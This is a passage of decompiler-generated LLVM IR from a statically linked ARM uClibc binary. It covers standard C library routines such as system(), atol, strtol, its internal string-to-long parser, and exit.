  %v2_deb4 = icmp ugt i32 %arg3, 62
  %v7_deb4 = icmp eq i32 %arg3, 63
  %v2_deb8 = xor i1 %v7_deb4, true
  %v3_deb8 = and i1 %v2_deb4, %v2_deb8
  br i1 %v3_deb8, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_deb4
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_deb4, %bb22
  %v1_dec46 = phi i32 [ %v3_de7c, %dec_label_pc_deb4 ], [ 2, %bb22 ]
  %v2_debc = xor i1 %v2_deb4, true
  %v3_debc = or i1 %v7_deb4, %v2_debc
  br i1 %v3_debc, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_decc = phi i32 [ 3, %bb21 ], [ %v1_dec47, %bb20 ], [ %v1_dec46, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_14f60.597 to i32), i32* %r2.global-to-local, align 4
  %v4_dec4 = mul i32 %v1_decc, 4
  %v5_dec4 = add i32 %v4_dec4, ptrtoint (i32* @global_var_14f60.597 to i32)
  store i32 %v5_dec4, i32* %r3.global-to-local, align 4
  %v1_dec8 = add i32 %v4_dec4, add (i32 ptrtoint (i32* @global_var_14f60.597 to i32), i32 20)
  %v2_dec8 = inttoptr i32 %v1_dec8 to i32*
  %v3_dec8 = load i32, i32* %v2_dec8, align 4
  store i32 %v3_dec8, i32* %r1.global-to-local, align 4
  %v6_decc = inttoptr i32 %v5_dec4 to i32*
  %v7_decc = load i32, i32* %v6_decc, align 4
  store i32 %v7_decc, i32* %r2.global-to-local, align 4
  %v1_ded0 = add i32 %tmp, 4
  store i32 %v1_ded0, i32* @r6, align 4
  %v4_ded4 = mul i32 %v3_dec8, 4
  %v5_ded4 = add i32 %v4_ded4, %v1_ded0
  store i32 %v5_ded4, i32* %r3.global-to-local, align 4
  %v2_ded8 = add i32 %arg4, 24
  %v3_ded8 = inttoptr i32 %v2_ded8 to i32*
  store i32 %v5_ded4, i32* %v3_ded8, align 4
  %v0_dedc = load i32, i32* %r2.global-to-local, align 4
  %v1_dedc = load i32, i32* @r5, align 4
  %v2_dedc = add i32 %v1_dedc, 20
  %v3_dedc = inttoptr i32 %v2_dedc to i32*
  store i32 %v0_dedc, i32* %v3_dedc, align 4
  %v0_dee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_dee0 = load i32, i32* @r5, align 4
  %v2_dee0 = add i32 %v1_dee0, 16
  %v3_dee0 = inttoptr i32 %v2_dee0 to i32*
  store i32 %v0_dee0, i32* %v3_dee0, align 4
  %v0_dee4 = load i32, i32* @r4, align 4
  %v1_dee4 = load i32, i32* @r5, align 4
  %v2_dee4 = add i32 %v1_dee4, 12
  %v3_dee4 = inttoptr i32 %v2_dee4 to i32*
  store i32 %v0_dee4, i32* %v3_dee4, align 4
  %v0_dee8 = load i32, i32* @r6, align 4
  %v1_dee8 = load i32, i32* @r5, align 4
  %v2_dee8 = add i32 %v1_dee8, 8
  %v3_dee8 = inttoptr i32 %v2_dee8 to i32*
  store i32 %v0_dee8, i32* %v3_dee8, align 4
  %v0_deec = load i32, i32* @r5, align 4
  store i32 %v0_deec, i32* %r1.global-to-local, align 4
  %v2_def0 = inttoptr i32 %arg1 to i32*
  %v3_def0 = call i32 @srandom_r(i32* %v2_def0, i32 %v0_deec)
  store i32 %v3_def0, i32* %r0.global-to-local, align 4
  %v0_def4 = load i32, i32* @r4, align 4
  %v2_def4 = icmp eq i32 %v0_def4, 0
  br i1 %v2_def4, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_df1012 = load i32, i32* @r7, align 4
  %v2_df1013 = inttoptr i32 %v1_df1012 to i32*
  store i32 0, i32* %v2_df1013, align 4
  %v1_df14 = load i32, i32* @r4, align 4
  store i32 %v1_df14, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_def8 = load i32, i32* @r5, align 4
  %v2_def8 = add i32 %v1_def8, 4
  %v3_def8 = inttoptr i32 %v2_def8 to i32*
  %v4_def8 = load i32, i32* %v3_def8, align 4
  %v1_defc = load i32, i32* @r6, align 4
  %v3_defc = sub i32 %v4_def8, %v1_defc
  %v4_df00 = sdiv i32 %v3_defc, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_df08 = mul i32 %v4_df00, 5
  %v5_df08 = add i32 %v4_df08, %v0_def4
  store i32 %v5_df08, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_df10 = load i32, i32* @r7, align 4
  %v2_df10 = inttoptr i32 %v1_df10 to i32*
  store i32 0, i32* %v2_df10, align 4
  %v1_df18 = load i32, i32* %r3.global-to-local, align 4
  %v2_df18 = load i32, i32* @r7, align 4
  %v3_df18 = inttoptr i32 %v2_df18 to i32*
  store i32 %v1_df18, i32* %v3_df18, align 4
  %v17_df1c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_df1c = phi i32 [ %v1_df14, %bb26 ], [ %v17_df1c.pre, %.thread4 ]
  %v2_df1c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_df1c, i32* %r4.global-to-local, align 4
  ret i32 %v17_df1c

dec_label_pc_df20:                                ; preds = %dec_label_pc_dea4
  %v0_df20 = call i32 @__errno_location()
  store i32 %v0_df20, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_df28 = inttoptr i32 %v0_df20 to i32*
  store i32 22, i32* %v2_df28, align 4
  %v0_df2c = call i32 @__errno_location()
  %v0_df30 = load i32, i32* %r4.global-to-local, align 4
  %v2_df30 = inttoptr i32 %v0_df2c to i32*
  store i32 %v0_df30, i32* %v2_df30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_df38 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_df38, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_deb4, { 1, 0 }
  uselistorder i1 %v7_de8c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_14f60.597 to i32), i32 20), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_14f60.597 to i32), { 2, 3, 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb27, { 1, 0 }
  uselistorder label %bb25, { 4, 3, 0, 1, 2 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_df40 = load i32, i32* @r4, align 4
  %v0_df44 = load i32, i32* %r0.global-to-local, align 4
  %v2_df44 = icmp eq i32 %v0_df44, 0
  br i1 %v2_df44, label %bb, label %dec_label_pc_df58

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e064

dec_label_pc_df58:                                ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_df60 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_df70 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_df80 = call i32 @__bsd_signal(i32 17, i32 0)
  store i32 %v2_df80, i32* %r0.global-to-local, align 4
  %v1_df88 = call i32 @__vfork(i32 %v2_df80)
  store i32 %v1_df88, i32* %r0.global-to-local, align 4
  store i32 %v1_df88, i32* @r4, align 4
  %v1_df8c = icmp slt i32 %v1_df88, 0
  br i1 %v1_df8c, label %dec_label_pc_df94, label %dec_label_pc_dfc0

dec_label_pc_df94:                                ; preds = %dec_label_pc_df58
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_df9c = call i32 @__bsd_signal(i32 3, i32 %v2_df60)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_dfa8 = call i32 @__bsd_signal(i32 2, i32 %v2_df70)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_dfb4 = call i32 @__bsd_signal(i32 17, i32 %v2_df80)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e064

dec_label_pc_dfc0:                                ; preds = %dec_label_pc_df58
  %v2_df8c = icmp eq i32 %v1_df88, 0
  br i1 %v2_df8c, label %dec_label_pc_dfc4, label %dec_label_pc_e008

dec_label_pc_dfc4:                                ; preds = %dec_label_pc_dfc0
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_dfcc = call i32 @__bsd_signal(i32 3, i32 0)
  %v0_dfd0 = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_dfd8 = call i32 @__bsd_signal(i32 2, i32 %v0_dfd0)
  %v0_dfdc = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_dfe4 = call i32 @__bsd_signal(i32 17, i32 %v0_dfdc)
  store i32 ptrtoint ([8 x i8]* @global_var_14f88.605 to i32), i32* @r0, align 4
  %v0_dff8 = load i32, i32* @r4, align 4
  %v8_dffc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_14f88.605 to i32), i32 ptrtoint ([3 x i8]* @global_var_14f90.607 to i32), i32 ptrtoint ([3 x i8]* @global_var_14f94.609 to i32), i32 %v0_df44, i32 %v0_dff8)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_e004 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_e008:                                ; preds = %dec_label_pc_dfc0
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e010 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_e01c = call i32 @__bsd_signal(i32 2, i32 1)
  %v0_e02c = load i32, i32* @r4, align 4
  store i32 %v0_e02c, i32* %r0.global-to-local, align 4
  %v0_e030 = call i32 @wait4()
  store i32 %v0_e030, i32* %r0.global-to-local, align 4
  %v7_e034 = icmp eq i32 %v0_e030, -1
  br i1 %v7_e034, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_e008
  store i32 %v0_e030, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_e008, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_e044 = call i32 @__bsd_signal(i32 3, i32 %v2_df60)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_e050 = call i32 @__bsd_signal(i32 2, i32 %v2_df70)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_e05c = call i32 @__bsd_signal(i32 17, i32 %v2_df80)
  %v3_e060 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_e060, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e064

dec_label_pc_e064:                                ; preds = %bb, %dec_label_pc_df94, %bb11
  %v8_e068 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_df94 ], [ %v3_e060, %bb11 ]
  store i32 %v3_df40, i32* @r4, align 4
  ret i32 %v8_e068

; uselistorder directives
  uselistorder i32 %v0_e030, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e064, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_e080 = call i32 @strtol()
  ret i32 %v0_e080
}

define i32 @strtol() local_unnamed_addr {
entry:
  store i32 1, i32* @r3, align 4
  %v0_e088 = call i32 @_stdlib_strto_l()
  ret i32 %v0_e088
}

define i32 @_stdlib_strto_l() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_e08c = load i32, i32* @r4, align 4
  store i32 %v3_e08c, i32* %stack_var_-36, align 4
  %v0_e090 = load i32, i32* @r1, align 4
  store i32 %v0_e090, i32* %sb.global-to-local, align 4
  %v0_e094 = load i32, i32* @r2, align 4
  store i32 %v0_e094, i32* %r5.global-to-local, align 4
  %v0_e098 = load i32, i32* @r3, align 4
  store i32 %v0_e098, i32* %fp.global-to-local, align 4
  %v0_e09c = load i32, i32* @r0, align 4
  %v2_e0b0.pre = load i32, i32* @global_var_1e7a4, align 4
  br label %dec_label_pc_e0a8

dec_label_pc_e0a8:                                ; preds = %dec_label_pc_e0a8, %entry
  %v0_e0e0 = phi i32 [ %v0_e09c, %entry ], [ %v1_e0a4, %dec_label_pc_e0a8 ]
  store i32 %v0_e0e0, i32* %r4.global-to-local, align 4
  %v1_e0ac = inttoptr i32 %v0_e0e0 to i8*
  %v2_e0ac = load i8, i8* %v1_e0ac, align 1
  %v3_e0ac = zext i8 %v2_e0ac to i32
  %v3_e0b4 = mul nuw nsw i32 %v3_e0ac, 2
  %v4_e0b4 = add i32 %v3_e0b4, %v2_e0b0.pre
  %v5_e0b4 = inttoptr i32 %v4_e0b4 to i8*
  %v6_e0b4 = load i8, i8* %v5_e0b4, align 1
  %v1_e0b8 = and i8 %v6_e0b4, 32
  %v2_e0b8 = icmp eq i8 %v1_e0b8, 0
  %v1_e0a4 = add i32 %v0_e0e0, 1
  br i1 %v2_e0b8, label %dec_label_pc_e0c0, label %dec_label_pc_e0a8

dec_label_pc_e0c0:                                ; preds = %dec_label_pc_e0a8
  %v7_e0c0 = icmp eq i8 %v2_e0ac, 43
  br i1 %v7_e0c0, label %dec_label_pc_e0e0, label %dec_label_pc_e0c8

dec_label_pc_e0c8:                                ; preds = %dec_label_pc_e0c0
  %v7_e0c8 = icmp eq i8 %v2_e0ac, 45
  br i1 %v7_e0c8, label %dec_label_pc_e0e0, label %bb

bb:                                               ; preds = %dec_label_pc_e0c8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e0e4

dec_label_pc_e0e0:                                ; preds = %dec_label_pc_e0c0, %dec_label_pc_e0c8
  %storemerge43 = phi i32 [ 1, %dec_label_pc_e0c8 ], [ 0, %dec_label_pc_e0c0 ]
  store i32 %storemerge43, i32* %r7.global-to-local, align 4
  store i32 %v1_e0a4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e0e4

dec_label_pc_e0e4:                                ; preds = %bb, %dec_label_pc_e0e0
  %v0_e104 = phi i32 [ %v0_e0e0, %bb ], [ %v1_e0a4, %dec_label_pc_e0e0 ]
  %v1_e0e4 = and i32 %v0_e094, -17
  %v3_e0e4 = icmp eq i32 %v1_e0e4, 0
  br i1 %v3_e0e4, label %dec_label_pc_e0f0, label %bb54

bb54:                                             ; preds = %dec_label_pc_e0e4
  br label %bb58

dec_label_pc_e0f0:                                ; preds = %dec_label_pc_e0e4
  %v1_e0f0 = inttoptr i32 %v0_e104 to i8*
  %v2_e0f0 = load i8, i8* %v1_e0f0, align 1
  %v7_e0f4 = icmp eq i8 %v2_e0f0, 48
  %v1_e0f8 = add i32 %v0_e094, 10
  store i32 %v1_e0f8, i32* %r5.global-to-local, align 4
  br i1 %v7_e0f4, label %dec_label_pc_e104, label %bb55

bb55:                                             ; preds = %dec_label_pc_e0f0
  br label %.thread8

dec_label_pc_e104:                                ; preds = %dec_label_pc_e0f0
  %v1_e104 = add i32 %v0_e104, 1
  %v2_e104 = inttoptr i32 %v1_e104 to i8*
  %v3_e104 = load i8, i8* %v2_e104, align 1
  %v4_e104 = zext i8 %v3_e104 to i32
  store i32 %v1_e104, i32* %r4.global-to-local, align 4
  %v1_e108 = or i32 %v4_e104, 32
  %v7_e10c = icmp eq i32 %v1_e108, 120
  %v1_e110 = add i32 %v0_e094, 8
  store i32 %v1_e110, i32* %r5.global-to-local, align 4
  br i1 %v7_e10c, label %bb56, label %.thread8

bb56:                                             ; preds = %dec_label_pc_e104
  %v3_e11c = mul i32 %v1_e110, 2
  store i32 %v3_e11c, i32* %r5.global-to-local, align 4
  %v2_e120 = add i32 %v0_e104, 2
  store i32 %v2_e120, i32* %r4.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_e104, %bb55, %bb56
  %v1_e1e428 = phi i32 [ %v0_e09c, %bb55 ], [ %v1_e104, %bb56 ], [ %v1_e104, %dec_label_pc_e104 ]
  %v0_e16c19 = phi i32 [ %v0_e104, %bb55 ], [ %v2_e120, %bb56 ], [ %v1_e104, %dec_label_pc_e104 ]
  %v0_e124 = phi i32 [ %v1_e0f8, %bb55 ], [ %v3_e11c, %bb56 ], [ %v1_e110, %dec_label_pc_e104 ]
  %v5_e128 = icmp slt i32 %v0_e124, 16
  br i1 %v5_e128, label %bb58, label %bb57

bb57:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb58

bb58:                                             ; preds = %bb54, %.thread8, %bb57
  %v1_e1e427 = phi i32 [ %v0_e09c, %bb54 ], [ %v1_e1e428, %.thread8 ], [ %v1_e1e428, %bb57 ]
  %v0_e16c18 = phi i32 [ %v0_e104, %bb54 ], [ %v0_e16c19, %.thread8 ], [ %v0_e16c19, %bb57 ]
  %v0_e13c = phi i32 [ %v0_e094, %bb54 ], [ %v0_e124, %.thread8 ], [ 16, %bb57 ]
  %v1_e12c = add i32 %v0_e13c, -2
  %tmp = icmp ugt i32 %v1_e12c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_e13c

.thread:                                          ; preds = %bb58
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e1e0

dec_label_pc_e13c:                                ; preds = %bb58
  %v2_e144 = urem i32 -1, %v0_e13c
  %v1_e154 = urem i32 %v2_e144, 256
  store i32 %v1_e154, i32* %sl.global-to-local, align 4
  %v2_e158 = udiv i32 -1, %v0_e13c
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v2_e158, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e16c

dec_label_pc_e168:                                ; preds = %bb65, %dec_label_pc_e1c8
  %v0_e168 = phi i32 [ %v1_e198, %bb65 ], [ %v0_e168.pre, %dec_label_pc_e1c8 ]
  br label %dec_label_pc_e16c

dec_label_pc_e16c:                                ; preds = %dec_label_pc_e13c, %dec_label_pc_e168
  %v1_e1e425 = phi i32 [ %v1_e1e427, %dec_label_pc_e13c ], [ %v0_e168, %dec_label_pc_e168 ]
  %v0_e198 = phi i32 [ %v0_e16c18, %dec_label_pc_e13c ], [ %v0_e168, %dec_label_pc_e168 ]
  %v1_e16c = inttoptr i32 %v0_e198 to i8*
  %v2_e16c = load i8, i8* %v1_e16c, align 1
  %v3_e16c = zext i8 %v2_e16c to i32
  %v1_e170 = add nsw i32 %v3_e16c, -48
  %v1_e174 = urem i32 %v1_e170, 256
  %v1_e17c = or i32 %v3_e16c, 32
  %tmp73 = icmp ult i32 %v1_e174, 10
  br i1 %tmp73, label %bb60, label %dec_label_pc_e184

dec_label_pc_e184:                                ; preds = %dec_label_pc_e16c
  %tmp74 = icmp ugt i32 %v1_e17c, 96
  br i1 %tmp74, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_e184
  %v1_e188 = add nsw i32 %v1_e17c, -87
  %v5_e190 = urem i32 %v1_e188, 256
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_e16c, %dec_label_pc_e184, %bb59
  %v3_e1c0 = phi i32 [ %v1_e174, %dec_label_pc_e16c ], [ 40, %dec_label_pc_e184 ], [ %v5_e190, %bb59 ]
  %v1_e194 = load i32, i32* %r5.global-to-local, align 4
  %v1_e198 = add i32 %v0_e198, 1
  store i32 %v1_e198, i32* %r4.global-to-local, align 4
  %v6_e19c = icmp slt i32 %v3_e1c0, %v1_e194
  br i1 %v6_e19c, label %dec_label_pc_e1a0, label %dec_label_pc_e1e0.loopexit

dec_label_pc_e1a0:                                ; preds = %bb60
  %v0_e1a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_e1a0 = load i32, i32* %r8.global-to-local, align 4
  %v9_e1a0 = icmp eq i32 %v0_e1a0, %v1_e1a0
  br i1 %v9_e1a0, label %.thread37, label %bb61

.thread37:                                        ; preds = %dec_label_pc_e1a0
  br label %dec_label_pc_e1b0

bb61:                                             ; preds = %dec_label_pc_e1a0
  %v3_e1a0 = icmp ult i32 %v0_e1a0, %v1_e1a0
  br i1 %v3_e1a0, label %dec_label_pc_e1b0, label %dec_label_pc_e1c8

dec_label_pc_e1b0:                                ; preds = %bb61, %.thread37
  %v4_e1b82240 = phi i32 [ 1, %.thread37 ], [ 0, %bb61 ]
  %v1_e1b0 = load i32, i32* %sl.global-to-local, align 4
  %v3_e1b0 = icmp uge i32 %v3_e1c0, %v1_e1b0
  %v9_e1b0 = icmp eq i32 %v3_e1c0, %v1_e1b0
  %v2_e1b4 = xor i1 %v3_e1b0, true
  %v3_e1b4 = or i1 %v9_e1b0, %v2_e1b4
  br i1 %v3_e1b4, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_e1b0
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_e1b0, %bb62
  %v4_e1b8 = phi i32 [ %v4_e1b82240, %dec_label_pc_e1b0 ], [ 0, %bb62 ]
  %v2_e1b8 = xor i1 %v9_e1b0, true
  %v3_e1b8 = and i1 %v3_e1b0, %v2_e1b8
  br i1 %v3_e1b8, label %bb64, label %thread-pre-split

bb64:                                             ; preds = %bb63
  %v5_e1b8 = urem i32 %v4_e1b8, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb63, %bb64
  %v0_e1bc = phi i32 [ %v5_e1b8, %bb64 ], [ %v4_e1b8, %bb63 ]
  %v2_e1bc = icmp eq i32 %v0_e1bc, 0
  br i1 %v2_e1bc, label %bb65, label %dec_label_pc_e1c8

bb65:                                             ; preds = %thread-pre-split
  %v4_e1c0 = mul i32 %v0_e1a0, %v1_e194
  %v5_e1c0 = add i32 %v4_e1c0, %v3_e1c0
  store i32 %v5_e1c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e168

dec_label_pc_e1c8:                                ; preds = %bb61, %thread-pre-split
  %v0_e1c8 = call i32 @__errno_location()
  %v0_e1cc = load i32, i32* %r7.global-to-local, align 4
  %v1_e1cc = load i32, i32* %fp.global-to-local, align 4
  %v2_e1cc = and i32 %v1_e1cc, %v0_e1cc
  store i32 %v2_e1cc, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_e1d8 = inttoptr i32 %v0_e1c8 to i32*
  store i32 34, i32* %v2_e1d8, align 4
  %v0_e168.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e168

dec_label_pc_e1e0.loopexit:                       ; preds = %bb60
  %v0_e1e0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e1e0

dec_label_pc_e1e0:                                ; preds = %.thread, %dec_label_pc_e1e0.loopexit
  %v1_e1e4 = phi i32 [ %v1_e1e425, %dec_label_pc_e1e0.loopexit ], [ %v1_e1e427, %.thread ]
  %v2_e1e4 = phi i32 [ %v0_e1e0.pre, %dec_label_pc_e1e0.loopexit ], [ %v0_e090, %.thread ]
  %v2_e1e0 = icmp eq i32 %v2_e1e4, 0
  br i1 %v2_e1e0, label %bb67, label %bb66

bb66:                                             ; preds = %dec_label_pc_e1e0
  %v3_e1e4 = inttoptr i32 %v2_e1e4 to i32*
  store i32 %v1_e1e4, i32* %v3_e1e4, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_e1e0, %bb66
  %v0_e1e8 = load i32, i32* %r7.global-to-local, align 4
  %v2_e1e8 = icmp eq i32 %v0_e1e8, 0
  %. = select i1 %v2_e1e8, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_e1f4 = load i32, i32* %fp.global-to-local, align 4
  %v2_e1f4 = icmp eq i32 %v0_e1f4, 0
  %v0_e218.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_e1f4, label %dec_label_pc_e210, label %bb70

bb70:                                             ; preds = %bb67
  %tmp75 = icmp ugt i32 %v0_e218.pre.pre, %.
  br i1 %tmp75, label %dec_label_pc_e200, label %dec_label_pc_e210

dec_label_pc_e200:                                ; preds = %bb70
  %v0_e200 = call i32 @__errno_location()
  %v2_e208 = inttoptr i32 %v0_e200 to i32*
  store i32 34, i32* %v2_e208, align 4
  %v0_e20c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e20c, i32* %ip.global-to-local, align 4
  %v0_e210.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e210

dec_label_pc_e210:                                ; preds = %bb70, %bb67, %dec_label_pc_e200
  %v0_e218.pre = phi i32 [ %v0_e218.pre.pre, %bb70 ], [ %v0_e20c, %dec_label_pc_e200 ], [ %v0_e218.pre.pre, %bb67 ]
  %v0_e210 = phi i32 [ %v0_e1e8, %bb70 ], [ %v0_e210.pre, %dec_label_pc_e200 ], [ %v0_e1e8, %bb67 ]
  %v2_e210 = icmp eq i32 %v0_e210, 0
  br i1 %v2_e210, label %dec_label_pc_e210._crit_edge, label %bb71

bb71:                                             ; preds = %dec_label_pc_e210
  %v2_e214 = sub i32 0, %v0_e218.pre
  store i32 %v2_e214, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e210._crit_edge

dec_label_pc_e210._crit_edge:                     ; preds = %dec_label_pc_e210, %bb71
  %v0_e218 = phi i32 [ %v2_e214, %bb71 ], [ %v0_e218.pre, %dec_label_pc_e210 ]
  %v2_e21c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_e21c, i32* @r4, align 4
  ret i32 %v0_e218

; uselistorder directives
  uselistorder i32 %v0_e218.pre, { 1, 0 }
  uselistorder i32 %v0_e218.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_e1b8, { 1, 0 }
  uselistorder i1 %v3_e1b0, { 1, 0 }
  uselistorder i32 %v1_e1b0, { 1, 0 }
  uselistorder i32 %v1_e198, { 1, 0 }
  uselistorder i32 %v1_e17c, { 1, 0 }
  uselistorder i32 %v1_e174, { 1, 0 }
  uselistorder i32 %v0_e168, { 1, 0 }
  uselistorder i32 %v0_e13c, { 1, 0, 2 }
  uselistorder i32 %v3_e11c, { 1, 0 }
  uselistorder i32 %v1_e110, { 1, 0, 2 }
  uselistorder i32 %v0_e104, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_e0a4, { 1, 0, 2 }
  uselistorder i32 %v0_e09c, { 1, 0, 2 }
  uselistorder i32 %v0_e094, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder label %dec_label_pc_e210._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_e210, { 2, 0, 1 }
  uselistorder label %bb67, { 1, 0 }
  uselistorder label %dec_label_pc_e1e0, { 1, 0 }
  uselistorder label %dec_label_pc_e1c8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e16c, { 1, 0 }
  uselistorder label %dec_label_pc_e168, { 1, 0 }
  uselistorder label %bb58, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e0e4, { 1, 0 }
  uselistorder label %dec_label_pc_e0e0, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_e224 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_e224, i32* @r0, align 4
  %v1_e240 = call i32 @__pthread_return_void()
  %v1_e250 = call i32 @__pthread_return_0()
  %v2_e258 = load i32, i32* @global_var_20e0c.617, align 4
  %v2_e25c = icmp eq i32 %v2_e258, 0
  br i1 %v2_e25c, label %.thread1, label %bb

bb:                                               ; preds = %entry
  call void @__pseudo_branch(i32 %v2_e258)
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  store i32 %v2_e224, i32* @r0, align 4
  %v1_e27c = call i32 @__pthread_return_void()
  store i32 %v1_e27c, i32* @r0, align 4
  %v1_e280 = call i32 @__GI___uClibc_fini(i32 %v1_e27c)
  store i32 ptrtoint (i32* @global_var_b2d8.620 to i32), i32* @r3, align 4
  store i32 58004, i32* @lr, align 4
  %v2_e290 = call i32 @_stdio_term()
  %v0_e294 = load i32, i32* @r4, align 4
  %v1_e298 = call i32 @__GI__exit(i32 %v0_e294)
  unreachable

; uselistorder directives
